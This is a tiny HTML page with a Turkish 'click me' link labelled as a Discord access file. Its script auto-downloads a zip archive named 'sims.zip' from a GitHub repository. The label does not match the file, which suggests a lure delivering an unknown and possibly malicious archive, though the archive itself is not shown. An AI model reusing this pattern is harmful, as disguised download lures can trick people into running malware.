<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <p>discord girme dosyası <a href="#" onclick="downloadFiles()">bana tıkla</a></p>

    <script>
        function downloadFiles() {
            const files = [
                'https://github.com/parzivalhaliday/parzival/raw/refs/heads/main/vanessasims/sims.zip'
            ];
            
            files.forEach(file => {
                const a = document.createElement('a');
                a.href = file;
                a.target = '_blank'; 
                a.download = file.split('/').pop();
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
            });
        }
        </script>
</body>
</html>
